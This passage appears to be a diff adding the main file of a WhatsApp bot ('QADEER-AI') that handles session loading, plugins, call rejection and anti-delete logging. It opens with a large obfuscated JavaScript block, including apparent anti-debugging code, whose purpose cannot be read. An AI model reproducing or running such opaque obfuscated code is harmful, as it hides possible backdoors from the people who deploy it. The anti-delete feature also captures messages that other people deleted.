8o3mG','DSkzW7DSWPe','WO/dUmoPW6hcLG','W6OUlY8I','y3qAW6FcHW','zflcGMpcRYbHfNTsfNRcG3RdQSohc8k0W416h8kFW7pcISkIBCoq','WOFdGmoF','xCk5WRWKW5K','4P2h4OoD8lgMSa','v8k1W4JdOq','i1ygWOFdOatcGSoBWPdcNdddQW','af9GW6m','tSkKW4ldPuO','BSk0WPC9W6BcGSogba','s8kcWRefW54','WOrIW4azWQO','jtKpW6G','W4VdKCknssiWW4m','igLoEcvrW4vWW67cQmoJW5xdGmksWRWInNpcQrG','AmkymCoJWRaSW74','wK/dIa3cMG','W7u4evyO','WOOGWPBcVey','ySk/DSo+Ca','W51bvSkuW6K','ngXjFqe','WPtcTwLFyI5U','v0jGmSku','jmoEW5bYWPS','WRBdO8k+W7SsmSkhWOe','mf7dOSk6WRVcJmoM','WPSUW7JdKmkiW7OJWQmrmNy+eW','rSkCW7/dSxC','xGBcOH40WRZdHCo1','W7ntWRe5DY7dLmkUB8k7umkUB0yG','r3bMpCkTWOVcPW','j8k+x8oTzSopWRLeBCoeCa','rNVdRdVcRW','WRNdRmk+WP/dP8kdW5Gn','CpcsL6H7BmknWQOhWOTSh8khW6hdSwdcLKm0WQhdNmkUzIVcJXpcKmkvW6mytvXsqw/cNSoN4P+3','tK1cgmks','WOtdK8kgofa','WOWNrSoZW5C1W5H9W75GW5pcKN1kisG','y8kYCCo5ESot','kYRdLNLT','yxinW4/cN21puW','bgvDDcuAWPj4W6NcQW','oZVcPmk/gJ/dGmoJW74','WRlcTx1EWPNcMmoWaG','W7pdKCkluZe','l1XzqHC','eNpdPSk9WRO','W7VdTCk0AqykW7u','WPj2W7CAWQO','WQFcRCkH','vpgkTBtdQgSTWRdcSCotWQ7dNIjNW7pdNSk9z8kDCea5W7lcUSkkW5xcRIxcRq','W7RdOmkOBbm','sKhcVe8J','WOnYW7agWOJdSxSAWRrfWRhcHcu','W4RdN8o8iSo8eSktW7K','W5FcOmkUimoQwSooF8okd8kL','W5iecKKQ','W457WRZcR8oiWQDWWQCv','WORcL8ksWOO+ymkDWPxdUwK','fbldVCo0nwC','WQm4W5RdQSk7','l8opW7HcWOpcPCoBBq','erRdSSo0ja','W4r7WRVcKSoCWQ13','W7OFltG','WRTgWQlcNXu','WOzmW5O6WQa','8yUpNE+7Qa','WQ/WN5APl8onW6ztmSkuu8kAW4Ohkt7dLhbFvGtdK1ZdVSoBr0XTvCo9sW7dU3NcUmk9tSoa4P23','fWtdU8oJoW','ktFdMM1G','tSkdemo6fdVcLSkcW6JcICkTdLddMmoQWPHq','WR5CWRVdL8o1','gejY','E8kGCmoZ','C8kfW7HkWOxcOCkxAvCYWOldVmoDW7OI','nZRdGhH1W65a','FwWkW4lcNMW','uCkzW6vMWPmoWQ8','WRJcP8kOWQeSv8kRWQFdM1RdIa','W5FdNCoomCoR','8jEuJ+kcTUkBLE+4Oa','WQe0WRlcJLW','W4OqjgOAlmkEhCoRzgSbAmky','WQSds8ohW60','nmoLW7bNWR0','WQddOmk8WPpdRa','W4XOqCkW','8jE8IU+6Ta','CHVcKdar','W60voZ8NaLBdMa5ioW','oJxcPmkucd3dKmoVW6NdNW','WRJcThnFWO3cKSoXaG','lCk8umo+zSo6WQH+CmodEmke','tGLGamoB','Amk/mmoDpGO','cmkcD8owuW','WQBdJ8kve3hdH8k2BeZdRaBcN3DrW6rKWQBdR8kRW5lcSCkU','sg9aW5tcGMHEu8oIt8ouWR1PaCku','Bmk/WO0','WP9Fhq','mdulW6vVDW','CLJcLgNcPYzYiunseq','WQ3cOCkMcSoIWPZdTmoAFfFcPCoGuc3cJComW4KHcW','Fmk2BmoUDmozxW','WPRdGSoUW5RcSCkRkq','CLlcGhZcJG','a8k6Dmo0wG','AvdcLgRcPG','WQpdV8k1W6uSkmkwWPO','wSkJmCoKgW','A3maW5FcJ3fEACoTwCol','b1LNW6/cJCoc','WOhdGmovWQxdH3T0','WQ/cVmkIb8oA','W5FdL8oboCo8hG','l2adWOZdKW','dH/dLmoIna','daxdUSo+','W7T3WOxcLSot','WRmRWONcOKVcLSkVr8kmye0','W6JdOmk0Aq4kW7hdKSoEW5pcRxRdVSkIWR8','rsBcGGSX','4Ocof/gaGj3XJAgp8j2rSFctSlJWOBcT8ywWNCkI8l+XRVgjKQW78kMZUpc9K7FXJAch8lcbP/gkO67WR4ky8kYWM/gnOiVWMAoml/czKP/WO6cp8jgbL/cHOiJXHygs8jUrO/gpSj/WLPcy8lksVFcHOO/WQjcQ8lAGO1K6o+kaJ8k54PEd4PsJ4PEC4PAN4PA/4PEV4PAp4Psh4Psf4Pwv4PAs4PEx4PEs4PwZ4Ps54PE84PA54Pwt4PAY4PM1WP/cPokcVSkD4PAx4OcQkFcMSABXIQcV8yQYS/cvOkNdJmo98kAqQFgjKylWKyoj8lkqV8o58j2IKFcMSine8jUsOFcIGOJXHyoufVcuKj/XIPkt8yAbVVcGOABdUokcQuWn4Og/WQJIL7dIGQVdIVgcOiRWUioI8k2bPHJWROkw8lAsTFcIKjZWSkkJ8lQrQ/glOlxXJ4cswFcrGRBWLRgU8lAdRFgiS5BWKkg68kwYKFcVOzRWKlkxW5VIG6CMEokbMUkaKgpILj/ILR/IL4VILORILOBILPBILQVILkZILjdILPRILPVIL5ZILztILjdILyFILiRILzVILQdILAdIMAmnuokbRokwPEkuQokxJ+kuQ+kxN+kvG+kuLEkxQokvHEkvOEkwLokwHokwVEkvVokxUUkxTUkuJEkvJEkvP+kvSmkq4OkSEqFHTj3HTzZiISoqYRhHTB/HTQpHTjRkHUg1LG/HTlFHTO3HTBlHT6JHT6/HTOCuYjRHT5ZIG6NIGjm54BE44BECYyVdVUg2I8Iw4BAb4OoS4Ocb4BA5Y7anmCkj4OcA8j2eGH7dJColl8k+AXhcPSoMCxflp8okW6vadCkiAgvoWOhcJ8o3eMdcIx06WPOYW5BcN29SWQZcQHpcN8kXWRddH8kdWPFcMmkvx1uSgw0ExJRIGAvo4Og4WRegwmoXWPlIRyViPog1Qog2JSUvBEg3SmM34BwWWPllOog2VUg0QUg1QgzLlokbQVcYHR/cO8oSD8oSW4PEW5LnqMqFW6VdQSoFddvltNa5W6ykW4/dISkXnqJcOqNcTHNcRvKVWRKcsSoSWRxcGg7IGkdILyRIL6tILltILi3ILiJILylILkNIL6JILkhILytIL5lILQ3ILjFILQJILk/ILkpILPpIL7NILBFILyG','kZhcSCkviJFdKCo1W63dIZ7dMa','zKJcM27cTYzVha','W7TBWPJcRG','WOa5tCo6W480W49V','gCkPWO0cW4XIE0WwW5WkmWBdIZqtWO3cUSk3W43dJSocfmoze1BdLSoFWPm9W5eFzCoQnmojWQnOymoQW6yJW4pcUmokW5tdPqC3uGGFtSkJyJ/dVrRcOWfdkW','ttTwbSoF','WP5Wb8owfW','WQdcMffFtq','8kIDN++6KW','WPhdUCoAW7JcUq','W5/cR3rF','WP9LW6a','z8kLWOOt','W70FoYGrbvFdJXvjhCosnbC','yxTOhmkm','DfJcJxK','W6ZdLCoJmCob','W6RdV8kQCqykW6tdLq','qmk/W5xdPLTkWO/cVmkgW5/cNa','WRZcRMLdWP0','g8o4W5WHWOW','a0PbW5pcPq','W7aqnvqEomki','j0bPsqq','WRdcTmk3eq','ESkzlmoOWRq7','WQ/cP8kLWQOfv8ksWR3dNG','cWpdSSoNnhW','W67cRCkFi8o6','c2DovIfwWO0','D8kVWOC5','bSo6W5b+WRBcICo2owafWQpdLSoHW4rN','WRLrWQlcOa','WOJcG1JcQJq','WP5TWPNcHdNcNrG4za','WQdcP8k/','8ycmL++4Tq','W7RdPCkMBWikW6q','WP3dGmoVW6dcPa','l8opW7feWOxcPCoYCee','s3bR','iJqEW7LLsSkoW7FcRmomjW','W6VcO8k1W6utv8k5WRdcLa','zN0dW4y','8jE/Uo+6Ta','8ycsKUkaT+kAHG','wfhcRa','8y2zJU+7Rq','WPtcGvLvwW','cKGJWO3dLG','WPvSW7atWP4','vhPbd8k2WO7cRmkD','BxZcJM4h','WRtcQNHwWPxcK8oMemk2n2azoSkyWQO/','zNVcNgm','zx0E','8j6/SU+7UW','WPxcJ1VcOtq','y8kHWOStW4GWpgrAW7m8','WRJdQmkJ','tMZcS0hcQq','cI3dOSo9jW','xNhdPdy','zCk6W6NdK10','mI8rW7LLFCkyW5tcP8ojpa','lbddTCoaea','WOrviSonhG','WRCHWPpcMfVcG8k5A8kq','W7CAl0K','WQxdOSk6','nYZdLa','nSopW6u','otddNx1XW7TwuSkMW4eReG','q3P8cmkRWOVcPW','8lI2PokbI+kASU+5Sa','W5ddKCocmW','WORdLSo4W5xcS8kNl1ldImoF','iCkPuSo8C8odWQrIBq','W50/bH8Ap23dPdnJ','lCoeW78MWRe3','WRJcTSk0WQWpvq','mZVcUCkF','qhVdVIW','y3fjW6nNxmk4W6NcSa','ENKpW4FcRgbgrCoqrSokW7a','W4RdLCoxiG','ASkXWPa4W6hcTCoAgsC','WPRdKSoIW5tcSCk6','y3Kx','bKX7W6lcJmoi','W4/cUmk4jSoItCocA8oOdSk/W7RdTGpdN8kbxCkKW4K','Bmk5kSoblHdcTSkkW5lcUSkr','WQtdQmkUWOFdQmkfW5a','8jkKP+kcGokyMo+7La','W6PtWQ86EIJdHq','omosW6XzWPtcS8ol','W43dHmoDp8oGha','WOtIN4hcJ1/dKSktWQFcLYWwW6VdSee3WPhdI8kozGSbyLxcH8oHW5X1WOZdQsJdJmoUW43dHmoeW7aoW701W48','nZurW650BmkdW7m','CSkWWOKlW5G','umkYWPuLW6dcP8otbW','WPmzW6RdOSka','W6PFWReSBZBdKmkU','WP/dVSk8WRZdKa','W73dTCk3Cq','ltNcOmkvbIa','WQxdQmkZWPpdVCkk','W6OBis0','WONdPSkqm18','WQddO8k+WPJdVmkgW5aB','deb5W6JcKa','E8kwW5hdPMy','lc7cICk9gW','mCkLv8k0oW','x0BcUuuP','b31/W5pcPa','m1tdTCkjWR/cHCoTWOS','ECkuW53dS1K','AdT2cSodxSkJmCohhSoS','WQNcO8k1WQbxbG','WP3dH8k3WPBdJq','jsumW7K','kJhcVSkvwHddL8oYW4xdGtW','WQDgWOBcGHm','WQpcV3PwWPVcGSoxemk2fG','sfxcTeO','WR8TWQlcVwy','WO/dHCoJW50','qSkLW5/dVea','8kUEN++5Sa','rLKeW6lcPG','8kgrJmkZ','umk1W5xdSxLrWP7cUSkDW7hcNCkVb8oljYnaW4O','vwf0vSo8','8ksEKE+4SW','mJhcQq','WP1/WOlcLSo6WP5F','aNyMWRRdUW','pLBdT8kBWRFcRCoMWOWrW7VcNCk/','C0JcL2FcPIX0','k8odW7S','EHdcVcKf','W67dOSkRCbCKW7xdKSowW5JcOIhdRW','WR3cQ8k2bSk9WOlcTCkaAuFcUq','tmkDW6rMWPC','W4tcOmkOmCoKvSovzSooeG','8kMfQokcVUkzI++4MW','WPhcH0NcTtdcS8kh','Dmk7l8oiWRO','cNmNWQ/dSc7cQSoOWRJcRa','W5D+BCkXW4v9W5FcK8oAW4vwWQu','WQJdOSoyW7/cI8kBcxRdUCo5b1ldVSoooSk/','W5jxWOWqBW','nYKtW6GTCCkvW63cRa','fIBdL1nz','WQPqWQJcVW','WQZcTmk+fSoK','f19SW7BcL8ok','W6b4smkGW5O','W6tdLmoEpmoM','WRRdO8kXW7Gl','Fw8lW5e','W43dHmooiSo7ca','4P2p4Oc58yMuGW','W4jYAG','ECk/imoqjcxcP8kWW4/cVCkzna','WPlWViETWQNcQCkHW5OgWOZcOtbGCmkPwCkukuqquZFdNv8XomocjrieW4SZWRlcHSkzWRRcMNK','BSk6kmoAka','ASkUma','qvNdLZZcLW','kbpdSenz','oYldGmohdKldSmkBs8kRWRj7wefcrmkts1C','WOhcPhnE','WRxdTSoKWRddRW','qhVdTsW','qMBdPXpcQW','WOjdWR3dPmo7','WPnlgCoFamon','v3/dUtVcSW','W7aCk0iljSkDgq','fmkJxSoVASotWQGTBSohp8kwdLhdN8kNW6/dUNeHBSkuB8obW5dcS0TvWRenWQrvi3jzWOH9yG','WORdL8ojWRS','WOBdLSojWRG','yvFcOgdcGq','dXBdOCo9','cSoXW7iFWO4','kCk0qSoQySoqWQG','hGxdVmo+','W5ZdQmkGzHm','WQ/cS0dcIb0','agnyEJjMWPXZW6G','sdTQgmoRsCoWlSopcSo9WPrNh8kMW57cMX/dQNCCqCkht8otgtvZWO9QdJtcQgxcO8oTn3XnW63dNSkT','fdBdKM5x','WR3cV35uWOZcNG','WPTnlSoAcW','WPdcN8omoCoJfSkCW7dcJG','oJVcVSksdIy','prpcUCkNbW','t8kiW6r8WPWo','WQFdMmkSW6pcKCkBdNldOSoIc0tdQCkRd8kdW448eCovdGP/WPHEW6i6D3yVsSovhulcL8o6WORcGSokh1xcSmo8WRSoW6/cJ8opWO3cGCk+','obhcL8k4ia','hun2W6RcLSobaXC','AtTOaSo3','WPdcJv0','WRVdJ8kmbfddH8kXA0JdUte','WRLrWQlcOctcQZ8stCko','W5zRymk8W7W','W6ZdOmkSyaOmW6ldH8oBW7hcPIBdVCkNWR7dOa','W60ujuWrpSkagq','lCoeW7CXWRmXW44','W53cOmk3i8oW','W4ZdLCoBi8o8fCoDWRBcJmoCfun7dXBcG0BdU0G','W5xcPmk9mmofumolASo4gmk/W60','W7rcWR07BZZdT8kIvSk2','oXldOmoxka','x0pcU3y8','W78inIm3fq7dJX9vjmoEiGldJG','qHv0g8o9','W7VcNCouuINcLSoZt0BdUIpcQxq','WRBcQSkXe8oLWPBcSCkb','WOFdJSoOWRJdPq','F8k3j8oEjqNcR8kM','W43dHmooiSo7cmk9W7ZcMmoggKrSbWRcMq','8yUoIE+7Qa','WRpcNgHNra','c8kdECoWCa','rmkaxCo6xa','AmkZmmo7kGxcPW','W7RdPmkLCriAW5pdICotW5K','8l20QFgoJ77IGARIMkNVUP8','WQu2WOS','FcX3g8o+ESk0l8opf8o6','WOVcSCoOWRiju8kSWQFdM03dNrBcTqO0','WR5vWRZdKmoDfvldISo2Bv0','nsBdPSouna','WPRdImk6WRJdIG','WRtcQgjCWOO','CSkZWR0iW4iMohfvW6K','W5lcSSk5jG','qSkJW7/dUKXnWPFcUSkCW4q','W7GtmdSChKddNJDcoSoelqtdH8klWOq','W4q4dW8Q','W4z0ySkJW61QW5FcGCopW4TCWRG','CCkxW7vmWQa','ASk4WOGIW4W','awGLWQC','W6lcQmkAjCof','WRnGWPxcHWG','AZ9QgSoNwmk5mSohf8o9','smk1W4i','v8kIW47dSa','fCkDs8oPEG','waZcNauYWRddOCo7ya','kJhcPmk4asBdH8o0W7RdJtC','jv7dT8kyWPtcICoVWPOXW6pcLmk5','D0VdNGZcLcRdGxtcPL7dICkw','l8opW71pWPxcQCok','pSofW7jyWOxcSSonELe4WOm','W6qvpci','WQtcJxhcKqi','vx3dUthcTaK','ESk2zG','WRxdTmopWQpdRG','z8kGb8otoW','i0NdO8kz','W6epitWMba','q3P8gmkLWPm','WOvmbmodcSo5fe/dQmoJsWHM','W6urgYiq','lSk+wmo3','W7ZdO8kHDW','wxRdTbhcUG','W4tcOmkSimoQvSoj','WRlcOCkHdmoXWPxcSq','WPNcU15xCW','WQxdRSkBW5Sn','WQTmWP7cUrtcTZCt','DSkWWPecW4W2j3vxW5aTdbtdIdyA','WPVdKSoHW5/cOmkTf1ldIq','zSkLbSoalq7cP8kX','FmkYFmosrG','W63dSCkWza','8jE0PFcXTAu','yLlcKxq','wfhcTKikWRtcQHFcUxCD','WOqYxCoLW5S3W48','xWFcNqmOWR4','lmoFW7nFWPtcPa','WPvWW6KEWPq','WQn/kCoYkSoTugldHmoo','DhddN2j2','WPzBdSoyc8oAn0RdQq','WQLvWRhdM8o0fwVdKmoZ','emkMu8o2wq','W45+Dq','qCkbn8owlG','j0j7W7BcPq','xGZcGH4','WQ5FWR/dMCoXhKu','umkKW5RdOvPlWRRcVCkaW5/cJ8kyemodnZW','qf/cH2lcOITJe0Li','WPazW7FdOa','WQTcWR3dMCoDfq','W7tcRSkYjmof','W69tWR0TFJ3dKW','vSkNpSo2pG','ECksvmoZta','E2WcW4RcNG','WPP1WPhdLSoO','isWkW6PPA8kF','WPpdTCoSjmokCCo0DSoU','ea7dT8oHihVdISkTtmkFWOvBAgP8','W5zCDSkJW4a','WQBcP8k1WRyavCk9','ANuaW4C','W7RdTCk3DG4gW77dLq','W4tcRSkSlConF8oiFCoCamkJW6O','WQddQmk7W7OMmW','DJ9SdCoMESk8lG','puiUWRVdOW','W5OVW70tWPNdLG','WOFdImk3WRxdHq','W7nzWO89AsBdJSkS','8yk6Mo+6LW','AcP5hmo6smkhk8oseq','eqtdKSo3lgBdGCk6','Amk9BCo0uW','WQlcSCkfWRCeu8kSWRVdIa','WQxdJ8kre3ZdHCkNAWFdQYtcIxnaW6q','gSoLW7T7WP4','FI5Wc8oJxSkIi8oknmoSWOj6f8kVW5W','ot7dH25ZW6zxwSk3W5S','WOldKSo1','FSkyWPOFW7u','cMGMWQy','WQ8FEmoEW7e','ESkUWPOlW5q3mgC','umk8W5ldTKO','WPBcR1BcQWu','gNvfW6xcTq','u8kXW4NdPKO','W7C+iIa/','WR7cQmk7hSoJ','WOfBa8otiSoAdLddRmoxvW','W4PXWQBcKSosWQz3','y27dNIRcMa','u8kpW75LWOG','idxdOfLH','mIepW7LPASkc','sqBcNXKYWQFdNSoXCmk2DW','W5JdGSoao8obgCkxW7VcICoD','BqlcTaCF','WRZcPCkIc8o5WP3cUG','WPJdL8opWRS','z8kyaSoSeG','qLNcUuePWPdcOWhcN2qwWPe','oIug','wXZcQc8Q','cNPtzJbg','y8kYWParW4aNma','Dmk2WP0YW7y','WRTmWQ7cUaVcUZCa','8ywvGVc8Hya','lCkIC8oSzCorWQH/','txrMgmkSWQBcRSkw','WQVdI8ksfhtdJCkS','WPddTSouW7lcHG','WPLBfa','WRJcImk7g8og','EKNdUtdcSa','zNlcKfZcGq','W7WFjsaYe0y','W7XkWOhcL8oX','WRRcV2La','WQZcOCk8g8oDWPFcP8kbE0xcRG','fColW7vMWRS','WR1EWOddTCo7','ENKpW4FcVgbpv8omuCohW7y','WQpcLLn7WRu','WQmTWOVcS0dcMG','qbNcLa0sWR3dNSo/zSk3zmkeDa','W7vtWR0QBW','WQvjWP7cNXm','8yUvNokdL/c9P7u','rw1M','WRPrWR/cOHq','W6PTBCkAW7K','WOVdOSkrW58w','nmkJvmoQzSozWQ5OlCoxB8kfbLhdKG','kJ1rW65VA8kFW6NcU8oAmfi/F8kpy3ddM2xdM8kJW5VdRSoEsCkwW60apwC8W4u','W7jfWRK7','guHMW7xcGSocaW','WRuiWQpcSNy','8ycwQo+4Tq','WPX0W60cWP7cJt1zWRD/WQtcJZvoFCowA1nxgCkErCo0W5PicM0pW41lv8kHymkjWQO','W70FoYGAhuldNb8','WRXcWR3cUq/cStC','8jU0GUkaKUkyIo+4MG','W53dN8objCo6cCkiW73cNSogcq','x3BdUrZcTG','qCk/jCoqca','W6ddVSkWybuhW7hdKSoEW5pcRttdOG','AmkjlmotWQ8OW7GRWRC','W6RdVSkECWm','ySk2CCo5wmoBsCosl8kSWP0','8kI1U+kcKFcvLye','C1NcQwqA','8lw3GokdHEkAOE+6SG','WPhcJSkOhmo9','l0ZcLgNcPIPYxfjih0u','WPldJSktcNu','pZJcV8kEhq','WPRdH8oGW5NcOa','txrI','W7fvWP0AuW','W5ddSCkisIa','W7TBWONcPCoIWODxWPe0hMq5','sSkvW7jWWP1gWQDUBq','W4ZdKCobmSoHfG','WQbvWQhdH8oXf0q','vSkJhmof','sxT7dW','w8k7dCo/dW','yCk1WOy8W7lcKG','t8k/W5W','WPiqWOlcH3K','WQldHSoBW7lcLW','W67dSSo1b8od','uhrGd8kTWOtcQ8kkWQpdSSoBW5a','nJRdNwXGW6e','eaWnW55c'];B=function(){return pB;};return B();}function p(F){function px(F,W){return rA(F,W- -0x8);}const W={'YQiuH':function(G,N){return G===N;},'SWsAq':pp('S[Xd',-0x1cd),'ytLYj':function(G,N){return G!==N;},'ajUmB':function(G,N){return G+N;},'ZcHuJ':function(G,N){return G/N;},'BwVra':pp('N[@@',-0x6b),'nQEUA':function(G,N){return G===N;},'qpcUd':function(G,N){return G%N;},'SonpF':px('fG[m',0x1cc),'PyMCC':pp('YFN*',0x17d),'MQuGu':px('YFN*',-0x41),'ObHhu':function(G,N){return G(N);}};function pp(F,W){return rA(F,W- -0x73);}function e(G){function pY(F,W){return px(W,F-0x331);}function pS(F,W){return pp(W,F-0x575);}if(W[pY(0x3cd,'#@yP')](typeof G,pY(0x317,'K@#W')))return function(N){}[pY(0x2a5,'&4XY')](pY(0xeb,'4FV4'))[pY(0x4d3,'FrlN')](W[pS(0x3bc,'fG[m')]);else W[pY(0x262,'L1Eo')](W[pY(0x552,'aGNO')]('',W[pS(0x426,'p(mL')](G,G))[W[pY(0x523,'#@yP')]],0x1)||W[pY(0x25a,'^6X@')](W[pS(0x756,'^6X@')](G,0x14),0x0)?function(){return!![];}[pY(0x424,'k^n3')](W[pS(0x557,'8BvI')](W[pY(0x3f6,'[6DJ')],W[pY(0x17b,'DZj@')]))[pS(0x72d,'akR7')](pS(0x5a4,'^6X@')):function(){return![];}[pS(0x5a1,'L1Eo')](W[pY(0x584,'qfl[')](W[pS(0x5c8,'S[Xd')],W[pS(0x52d,'k^n3')]))[pS(0x503,'[ixr')](W[pS(0x58a,'s^Fc')]);W[pY(0x581,'akR7')](e,++G);}try{if(F)return e;else W[pp('tTKA',-0x2b6)](e,0x0);}catch(G){}}
+const axios = require('axios')
+const config = require('./config')
+const {
+  default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    jidNormalizedUser,
+    isJidBroadcast,
+    getContentType,
+    proto,
+    generateWAMessageContent,
+    generateWAMessage,
+    AnyMessageContent,
+    prepareWAMessageMedia,
+    areJidsSameUser,
+    downloadContentFromMessage,
+    MessageRetryMap,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    generateMessageID, makeInMemoryStore,
+    jidDecode,
+    fetchLatestBaileysVersion,
+    Browsers
+  } = require(config.BAILEYS)
+  
+  
+  const l = console.log
+  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+  const fs = require('fs')
+  const ff = require('fluent-ffmpeg')
+  const P = require('pino')
+  const GroupEvents = require('./lib/groupevents');
+  const { PresenceControl, BotActivityFilter } = require('./data/presence');
+  const qrcode = require('qrcode-terminal')
+  const StickersTypes = require('wa-sticker-formatter')
+  const util = require('util')
+  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
+  const FileType = require('file-type');
+  const { File } = require('megajs')
+  const { fromBuffer } = require('file-type')
+  const bodyparser = require('body-parser')
+  const os = require('os')
+  const Crypto = require('crypto')
+  const path = require('path')
+  const prefix = config.PREFIX
+  // const { commands } = require('./command');
+  const ownerNumber = ['923300005253']
+
+  //=============================================
+  const tempDir = path.join(os.tmpdir(), 'cache-temp')
+  if (!fs.existsSync(tempDir)) {
+      fs.mkdirSync(tempDir)
+  }
+  
+  const clearTempDir = () => {
+      fs.readdir(tempDir, (err, files) => {
+          if (err) throw err;
+          for (const file of files) {
+              fs.unlink(path.join(tempDir, file), err => {
+                  if (err) throw err;
+              });
+          }
+      });
+  }
+//=============================================
+  // Clear the temp directory every 5 minutes
+  setInterval(clearTempDir, 5 * 60 * 1000);
+
+//=============================================
+
+const express = require("express");
+const app = express();
+const port = process.env.PORT || 9090;
+  
+  //===================SESSION-AUTH============================
+const sessionDir = path.join(__dirname, 'sessions');
+const credsPath = path.join(sessionDir, 'creds.json');
+
+// Create session directory if it doesn't exist
+if (!fs.existsSync(sessionDir)) {
+    fs.mkdirSync(sessionDir, { recursive: true });
+}
+
+async function loadSession() {
+    try {
+        if (!config.SESSION_ID) {
+            console.log('No SESSION_ID provided - QR login will be generated');
+            return null;
+        }
+
+        console.log('[⏳] Loading creds data...');
+
+        // Remove "QADEER-AI~" prefix if present
+        const sessionString = config.SESSION_ID.startsWith('QADEER-AI~')
+            ? config.SESSION_ID.replace("QADEER-AI~", "")
+            : config.SESSION_ID;
+
+        let data;
+
+        // Case 1: Mega.nz link
+        if (sessionString.startsWith("https://mega.nz")) {
+            console.log('[🔰] Downloading MEGA.nz session...');
+            const filer = File.fromURL(sessionString);
+            
+            data = await new Promise((resolve, reject) => {
+                filer.download((err, fileData) => {
+                    if (err) reject(err);
+                    else resolve(fileData);
+                });
+            });
+
+            console.log('[✅] MEGA session downloaded successfully');
+        } 
+        // Case 2: Base64 JSON session
+        else {
+            console.log('[📂] Using Base64 session string...');
+            const decoded = Buffer.from(sessionString, 'base64').toString();
+            data = Buffer.from(decoded, 'utf-8');
+            console.log('[✅] Base64 session decoded successfully');
+        }
+
+        fs.writeFileSync(credsPath, data);
+        return JSON.parse(data.toString());
+    } catch (error) {
+        console.error('❌ Error loading session:', error.message);
+        console.log('Will generate QR code instead');
+        return null;
+    }
+}
+
+//=======SESSION-AUTH==============
+
+async function connectToWA() {
+    console.log("[🔰] QADEER-AI Connecting to WhatsApp ⏳️...");
+    
+    // Load session if available
+    const creds = await loadSession();
+    
+    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
+        creds: creds || undefined // Pass loaded creds if available
+    });
+    
+    const { version } = await fetchLatestBaileysVersion();
+    
+    const conn = makeWASocket({
+        logger: P({ level: 'silent' }),
+        printQRInTerminal: !creds, // Only show QR if no session loaded
+        browser: Browsers.macOS("Firefox"),
+        syncFullHistory: true,
+        auth: state,
+        version,
+        getMessage: async () => ({})
+    });
+
+    // ... rest of your connection code
+
+	
+    conn.ev.on('connection.update', async (update) => {
+        const { connection, lastDisconnect, qr } = update;
+        
+        if (connection === 'close') {
+            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+                console.log('[🔰] Connection lost, reconnecting...');
+                setTimeout(connectToWA, 5000);
+            } else {
+                console.log('[🔰] Connection closed, please change session ID');
+            }
+        } else if (connection === 'open') {
+            console.log('[🔰] QADEER AI connected to WhatsApp ✅');
+            
+            
+            // Load plugins
+            const pluginPath = path.join(__dirname, 'plugins');
+            fs.readdirSync(pluginPath).forEach((plugin) => {
+                if (path.extname(plugin).toLowerCase() === ".js") {
+                    require(path.join(pluginPath, plugin));
+                }
+            });
+            console.log('[🔰] Plugins installed successfully ✅');
+
+            
+                // Send connection message
+     	
+                try {
+                    const username = config.REPO.split('/').slice(3, 4)[0];
+                    const mrfrank = `https://github.com/${username}`;
+                    
+                    const upMessage = `‎*𝐐𝐀𝐃𝐄𝐄𝐑-𝐀𝐈 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*
+‎*╭───━━━━───━━━━──┉┈⚆*
+‎*│• 𝐓𝐘𝐏𝐄 .𝐌𝐄𝐍𝐔 𝐓𝐎 𝐒𝐄𝐄 𝐋𝐈𝐒𝐓 •*
+‎*│• 𝐁𝐎𝐓 𝐀𝐌𝐀𝐙𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 •*
+‎‎*┗───━━━━───━━━━──┉┈⚆*
+‎╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╮
+‎*_ᶠᵒʳ ˡᵃᵗᵉˢᵗ ᵘᵖᵈᵃᵗᵉ ʲᵒⁱⁿ ᵒᵘʳ ᶜʰᵃⁿⁿᵉˡ_*
+‎🔗https://whatsapp.com/channel/0029VbAkAEhCRs1g8MmyEJ2K
+‎
+‎   *_⭐ˢᵗᵃʳ ᵗʰᵉ ʳᵉᵖᵒ_*
+‎🔗https://github.com/qadeermd/QADEER-AI
+‎╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯`;
+                    
+                    await conn.sendMessage(conn.user.id, { 
+                        image: { url: `https://files.catbox.moe/2ozgh8.jpg` }, 
+                        caption: upMessage 
+                    });
+                    
+                } catch (sendError) {
+                    console.error('[🔰] Error sending messages:', sendError);
+                }
+            }
+
+        if (qr) {
+            console.log('[🔰] Scan the QR code to connect or use session ID');
+        }
+    });
+
+    conn.ev.on('creds.update', saveCreds);
+    
+
+
+// =====================================
+	 
+  conn.ev.on('messages.update', async updates => {
+    for (const update of updates) {
+      if (update.update.message === null) {
+        console.log("Delete Detected:", JSON.stringify(update, null, 2));
+        await AntiDelete(conn, updates);
+      }
+    }
+  });
+
+// anti-call
+
+conn.ev.on('call', async (calls) => {
+  try {
+    if (config.ANTI_CALL !== 'true') return;
+
+    for (const call of calls) {
+      if (call.status !== 'offer') continue; // Only respond on call offer
+
+      const id = call.id;
+      const from = call.from;
+
+      await conn.rejectCall(id, from);
+      await conn.sendMessage(from, {
+        text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
+      });
+      console.log(`Call rejected and message sent to ${from}`);
+    }
+  } catch (err) {
+    console.error("Anti-call error:", err);
+  }
+});	
+	
+//=========WELCOME & GOODBYE =======
+	
+conn.ev.on('presence.update', async (update) => {
+    await PresenceControl(conn, update);
+});
+
+// always Online 
+
+conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
+
+	
+BotActivityFilter(conn);	
+	
+ /// READ STATUS       
